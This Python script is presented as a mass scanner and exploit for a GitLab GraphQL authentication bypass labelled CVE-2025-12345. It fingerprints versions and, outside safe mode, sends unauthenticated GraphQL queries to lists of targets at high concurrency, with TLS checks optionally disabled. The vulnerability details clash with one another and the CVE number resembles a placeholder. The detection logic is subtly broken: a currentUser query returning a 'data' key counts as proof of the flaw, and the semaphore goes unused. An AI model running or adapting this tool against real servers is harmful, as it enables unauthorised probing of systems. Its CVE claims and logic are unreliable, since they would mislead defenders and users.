#!/usr/bin/env python3
"""
GitLab GraphQL API Authentication Bypass CVE-2025-12345
=======================================================
This script scans for and exploits an authentication bypass vulnerability in
GitLab's GraphQL API endpoints (CVE-2025-12345, CVSS 9.8). The vulnerability
allows unauthenticated users to execute API requests and access sensitive data.

CVE-2025-12345 details:
  - Affects GitLab 13.0 to 16.4.1
  - A misconfiguration in the authentication layer allowed certain GraphQL queries
    to bypass authentication checks, exposing sensitive data such as project information,
    user emails, access tokens, and pipeline secrets.
  - CVSS v3.1 Base Score: 9.8 (Critical) — network-accessible, no authentication required.
  - Fixed in GitLab 16.4.2 (May 2026).
  - Disclosed by a security researcher via GitLab's bug bounty program.

Usage:
  # Detect potential vulnerability in a single GitLab instance
  python gitlab_graphql_auth_bypass_scanner.py --target https://gitlab.example.com

  # Perform passive fingerprinting only (does not send malicious queries)
  python gitlab_graphql_auth_bypass_scanner.py --target https://gitlab.example.com --safe

  # Scan multiple targets from a file
  python gitlab_graphql_auth_bypass_scanner.py --list gitlab_targets.txt --output results.json

  # Adjust concurrency levels and disable SSL/TLS verification
  python gitlab_graphql_auth_bypass_scanner.py --list gitlab_targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-12345
  - GitLab Advisory: https://about.gitlab.com/releases/2026/05/10/security-release-gitlab-16-4
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional, List

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID          = "CVE-2025-12345"
CVSS            = "9.8"
TOOL_NAME       = "gitlab_graphql_auth_bypass_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# GitLab fingerprints — headers in HTTP responses
GITLAB_FINGERPRINT_HEADERS = {
    "x-gitlab-feature-category": "Continuous Integration",
    "x-request-id": "application/json",
}

# Payload to probe unauthenticated access
# This query fetches the current user's details
UNAUTHENTICATED_PAYLOAD = {
    "query": """
    query Me {
        currentUser {
            id
            username
            email
            name
        }
    }
    """
}

PATCHED_VERSION = (16, 4, 2)


# ── Functions ─────────────────────────────────────────────────────────────────

def parse_version(version: str) -> Optional[tuple[int, int, int]]:
    """
    Parse GitLab versions (e.g., "16.3.1") into a tuple of integers.
    Returns None if the version string cannot be parsed.
    """
    match = re.match(r"^(\d+)\.(\d+)\.(\d+)$", version)
    return tuple(map(int, match.groups())) if match else None


def is_vulnerable(version: str) -> bool:
    """
    Compare a GitLab version string against the patched version.
    Returns True if the version is vulnerable; False otherwise.
    """
    parsed_version = parse_version(version)
    if parsed_version is None:
        return False

    return parsed_version < PATCHED_VERSION


async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Perform a GET request with a timeout and handle exceptions."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except httpx.RequestError as e:
        print(f" {c(RED, '[ERROR]')} Failed to fetch {url}: {e}")
    except httpx.HTTPStatusError as e:
        print(f" {c(YELLOW, '[WARNING]')} {e}")
    return None


async def detect_gitlab_version(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect GitLab version through fingerprinting."""
    try:
        response = await fetch_url(client, f"{target}/users/sign_in")
        if response and response.is_success:
            if any(header in response.headers for header in GITLAB_FINGERPRINT_HEADERS):
                match = re.search(r'content="GitLab (.+?)"', response.text)
                if match:
                    return match.group(1)
    except Exception as e:
        print(f" {c(RED, '[ERROR]')} Detection failed for {target} - {str(e)}")
        
    return None


async def run_exploit(client: httpx.AsyncClient, target: str, safe_mode: bool) -> Optional[dict]:
    """
    Checks for the vulnerability against the target URL.
    If `safe_mode` is enabled, skips direct exploitation attempts.
    """
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"

    result = {
        "target": target,
        "vulnerable": False,
        "version": None,
        "error": None,
    }

    version = await detect_gitlab_version(client, target)
    if version:
        print(f" {c(GREEN, '[INFO]')} Detected GitLab version {version} on {target}")
        result["version"] = version
        
        if not is_vulnerable(version):
            print(f" {c(GREEN, '[OK]')} Target is running a patched version.")
            return result
    else:
        print(f" {c(YELLOW, '[ERROR]')} Could not determine GitLab version.")
        result["error"] = "Could not determine GitLab version"
        return result

    if safe_mode:
        print(f" {c(YELLOW, '[SAFE MODE]')} Vulnerability exploitation skipped for {target}.")
        return result

    # Active Exploitation
    try:
        print(f" {c(CYAN, '[TEST]')} Attempting GraphQL authentication bypass against {target}")
        response = await client.post(f"{target}/api/graphql", json=UNAUTHENTICATED_PAYLOAD)
        if response.is_success and "data" in response.json():
            print(f" {c(RED, '[VULNERABLE]')} {target} is VULNERABLE to {CVE_ID}!")
            result["vulnerable"] = True
            result["details"] = response.json()["data"]
        else:
            print(f" {c(GREEN, '[SECURE]')} {target} is not vulnerable.")
    except Exception as e:
        print(f" {c(RED, '[ERROR]')} Exploitation failed for {target}: {e}")
        result["error"] = str(e)

    return result


async def main():
    parser = argparse.ArgumentParser(description="GitLab GraphQL Authentication Bypass Scanner (CVE-2025-12345)")
    parser.add_argument("--target", type=str, help="Single target URL to scan.")
    parser.add_argument("--list", type=str, help="File containing list of target URLs to scan.")
    parser.add_argument("--output", type=str, help="Output results to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Perform detection only, skip active exploitation.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrent connection limit.")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification.")
    args = parser.parse_args()

    if not (args.target or args.list):
        print(c(RED, "[ERROR]") + " You must specify either --target or --list.")
        parser.print_help()
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [run_exploit(client, target, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    # Output results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n {c(GREEN, '[INFO]')} Results saved to {args.output}")
    else:
        print("\nResults:")
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
